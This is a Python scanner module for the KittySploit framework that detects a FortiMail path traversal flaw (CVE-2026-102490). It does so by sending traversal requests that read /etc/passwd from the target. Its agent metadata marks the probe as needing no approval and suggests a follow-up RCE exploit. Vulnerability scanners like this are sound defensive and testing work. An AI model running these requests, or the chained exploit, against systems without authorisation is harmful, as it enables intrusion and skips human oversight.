#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detect FortiMail path traversal (CVE-2026-102490)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FortiMail CVE-2026-102490 Detection',
        'description': (
            'Detects FortiMail instances vulnerable to CVE-2026-102490 unauthenticated '
            'path traversal allowing arbitrary file write via crafted HTTP requests.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'cve': 'CVE-2026-102490',
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2026-102490'],
        'tags': ['web', 'scanner', 'fortinet', 'fortimail', 'path-traversal', 'kev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'chain': {
                'suggested_followups': ['exploits/linux/http/fortimail_cve_2026_102490_rce'],
            },
        },
    }

    TRAVERSAL_PATHS = (
        '/module/release_control/%2e%2e/%2e%2e/etc/passwd',
        '/api/v1/release/%2e%2e/%2e%2e/etc/passwd',
    )

    def run(self):
        panel = self.http_request(method='GET', path='/', allow_redirects=False)
        if not panel:
            return False
        body = (panel.text or '').lower()
        if 'fortimail' not in body and 'fortinet' not in body:
            headers = '\n'.join(f'{k}: {v}' for k, v in panel.headers.items()).lower()
            if 'fortimail' not in headers:
                return False
        for path in self.TRAVERSAL_PATHS:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code not in (200, 500):
                continue
            text = r.text or ''
            if 'root:' in text and '/bin/' in text:
                self.set_info(
                    severity='critical',
                    reason='FortiMail path traversal confirmed (CVE-2026-102490)',
                    path=path,
                    cve='CVE-2026-102490',
                )
                return True
        return False
